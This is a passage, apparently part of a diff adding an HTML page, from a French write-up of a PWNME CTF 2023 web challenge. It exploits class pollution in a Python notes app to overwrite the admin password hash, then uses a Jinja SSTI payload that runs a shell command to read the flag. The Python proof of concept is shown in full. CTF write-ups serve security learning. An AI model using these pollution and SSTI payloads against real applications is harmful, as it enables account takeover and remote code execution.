+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>users[<span style="color:#e6db74">&#39;admin&#39;</span>] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;password&#39;</span>: <span style="color:#66d9ef">None</span>, <span style="color:#e6db74">&#39;restricted&#39;</span>: <span style="color:#66d9ef">False</span>, <span style="color:#e6db74">&#39;seeTemplate&#39;</span>:<span style="color:#66d9ef">True</span> }
+</span></span></code></pre></div><p>Celui-ci a déjà les bonnes permissions mais nous ne connaissons pas son mot de passe.
+Plus loin on lit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>(self, username, password):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> username <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>users <span style="color:#f92672">and</span> self<span style="color:#f92672">.</span>users[username][<span style="color:#e6db74">&#39;password&#39;</span>] <span style="color:#f92672">==</span> hashlib<span style="color:#f92672">.</span>sha256(password<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest():
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span></code></pre></div><p>Le <em>login</em> se fait en hachant les mots de passe en <code>sha256</code>.<br>
+Nous allons donc réécrire le mot de passe de l&rsquo;utilisateur admin avec un sha256 dont nous connaissons le plaintext.</p>
+<h1 id="poc">POC.</h1>
+<p>On peut donc écrire une POC proprement :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">exploit</span>:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> __init__(self,url,session):
+</span></span><span style="display:flex;"><span>		self<span style="color:#f92672">.</span>url <span style="color:#f92672">=</span> url
+</span></span><span style="display:flex;"><span>		self<span style="color:#f92672">.</span>sess <span style="color:#f92672">=</span> session
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>(self,user,pwd):
+</span></span><span style="display:flex;"><span>		r <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>sess<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/login&#39;</span><span style="color:#f92672">%</span>(self<span style="color:#f92672">.</span>url),data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;username&#34;</span>:user,<span style="color:#e6db74">&#34;password&#34;</span>:pwd})
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Error while login user&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register</span>(self):
+</span></span><span style="display:flex;"><span>		self<span style="color:#f92672">.</span>user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([random<span style="color:#f92672">.</span>choice(<span style="color:#e6db74">&#39;abcdef&#39;</span>) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">15</span>)])
+</span></span><span style="display:flex;"><span>		self<span style="color:#f92672">.</span>pwd <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>user
+</span></span><span style="display:flex;"><span>		r <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>sess<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/register&#39;</span><span style="color:#f92672">%</span>(self<span style="color:#f92672">.</span>url),data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;username&#34;</span>:self<span style="color:#f92672">.</span>user,<span style="color:#e6db74">&#34;password&#34;</span>:self<span style="color:#f92672">.</span>pwd})
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Logout&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_note</span>(self,name,value):
+</span></span><span style="display:flex;"><span>		r <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>sess<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/create&#39;</span><span style="color:#f92672">%</span>(self<span style="color:#f92672">.</span>url),data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;name&#34;</span>:name,<span style="color:#e6db74">&#34;content&#34;</span>:value})
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;&lt;a href=&#34;articles/(.*?)&lt;/a&gt;&#39;</span>,r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view_note</span>(self,note):
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>sess<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/articles/</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">%</span>(self<span style="color:#f92672">.</span>url,note))<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exp <span style="color:#f92672">=</span> exploit(
+</span></span><span style="display:flex;"><span>	url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://13.37.17.31:50656&#39;</span>,
+</span></span><span style="display:flex;"><span>	session<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>session()
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>exp<span style="color:#f92672">.</span>register()
+</span></span><span style="display:flex;"><span>exp<span style="color:#f92672">.</span>login(exp<span style="color:#f92672">.</span>user,exp<span style="color:#f92672">.</span>pwd)
+</span></span><span style="display:flex;"><span>exp<span style="color:#f92672">.</span>create_note(
+</span></span><span style="display:flex;"><span>	name  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.users.admin.password&#39;</span>,
+</span></span><span style="display:flex;"><span>	value <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;vozec&#39;</span>)<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> exp<span style="color:#f92672">.</span>login(<span style="color:#e6db74">&#39;admin&#39;</span>,<span style="color:#e6db74">&#39;vozec&#39;</span>)
+</span></span></code></pre></div><p>Il ne nous reste plus qu&rsquo;à créer une note avec un SSTI:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ cycler<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;cat flag.txt&#39;</span>)<span style="color:#f92672">.</span>read() }}
+</span></span></code></pre></div><p>On ajoute à la POC précédente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>exp<span style="color:#f92672">.</span>create_note(
+</span></span><span style="display:flex;"><span>	name  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;rce&#39;</span>,
+</span></span><span style="display:flex;"><span>	value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{{ cycler.__init__.__globals__.os.popen(&#39;cat flag.txt&#39;).read() }}&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> exp<span style="color:#f92672">.</span>view_note(
+</span></span><span style="display:flex;"><span>	note <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;rce&#39;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>print(res)
+</span></span></code></pre></div><p>On obtient le flag : <code>PWNME{D3ep_P0l1ut1oN_C4n_b3_D3s7ruCt1vE_5c}</code></p>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="//localhost:1313/writeups/beat_me-pwnme-2023/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Beat me! | PWNME CTF 2023</a>
+        
+	    
+            <div class="next-post">
+                <a href="//localhost:1313/writeups/like_a_whispering_entropy-pwnme-2023/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Like a Whispering Entropy | PWNME CTF 2023</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents"></nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
